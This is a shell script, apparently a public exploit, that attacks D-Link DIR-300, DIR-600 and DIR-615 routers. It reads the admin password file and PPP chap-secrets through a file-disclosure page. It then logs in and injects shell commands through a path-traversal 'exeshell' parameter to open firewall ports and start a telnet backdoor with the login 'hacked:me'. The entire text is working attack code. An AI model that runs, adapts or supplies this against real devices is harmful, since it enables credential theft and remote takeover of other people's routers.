#!/bin/sh


if [ -z "$1" ]; then
        echo "d-link DIR-300 (all), DIR-600 (all), DIR-615 (fw 4.0)";
        echo "exploited by AKAT-1, 22733db72ab3ed94b5f8a1ffcde850251fe6f466, c8e74ebd8392fda4788179f9a02bb49337638e7b";
        echo "usage: $0 [router address] [telnet port]";
        exit 0;
fi;

if [ -z "$2" ]; then
        TPORT=3333;
else
        TPORT=$2;
fi

UPORT=31337;

echo "Trying $1 ...";

HTTPASSWD=`curl -sS "http://$1:8080/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd" | grep -A1 "<center>" | tail -1 | sed -e "s/\t//g ; s/^\([^:]*\):\([^:]*\)$/\1\n \2/g"`

if [ ! -z "$HTTPASSWD" ]; then
        L=`echo $HTTPASSWD | cut -d' ' -f1`;
        P=`echo $HTTPASSWD | cut -d' ' -f2`;

        echo "found username: $L";
        echo "found password: $P";


        curl -d "ACTION_POST=LOGIN&LOGIN_USER=$L&LOGIN_PASSWD=$P" -sS "http://$1/login.php" | grep -v "fail" 1>/dev/null

        if [ $? -eq 0 ]; then
                curl -sS 
"http://$1/tools_system.xgi?random_num=2011.9.22.13.59.33&exeshell=../../../../usr/sbin/iptables -t nat -A PRE_MISC -i 
eth0.2 -p tcp --dport $TPORT -j ACCEPT&set/runtime/syslog/sendmail=1" 1>/dev/null;
                curl -sS 
"http://$1/tools_system.xgi?random_num=2011.9.22.13.59.33&exeshell=../../../../usr/sbin/iptables -t nat -A PRE_MISC -i 
eth0.2 -p tcp --dport $UPORT -j ACCEPT&set/runtime/syslog/sendmail=1" 1>/dev/null;
                curl -sS 
"http://$1/tools_system.xgi?random_num=2011.9.22.13.59.33&exeshell=../../../../usr/sbin/telnetd -p $TPORT -l 
/usr/sbin/login -u hacked:me&set/runtime/syslog/sendmail=1" 1>/dev/null;

                echo "if you are lucky telnet is listening on $TPORT (hacked:me) ..."
                curl -sS "http://$1/logout.php"; 1>/dev/null;
        fi
fi

CHAP=`curl -sS "http://$1/model/__show_info.php?REQUIRE_FILE=/etc/ppp/chap-secrets" | grep -A1 "<center>" | sed -e "s/<center>//g"`

if [ ! -z "$CHAP" ]; then
        echo "found chap-secrets: $CHAP";
fi

echo "Bye bye.";

exit 0;
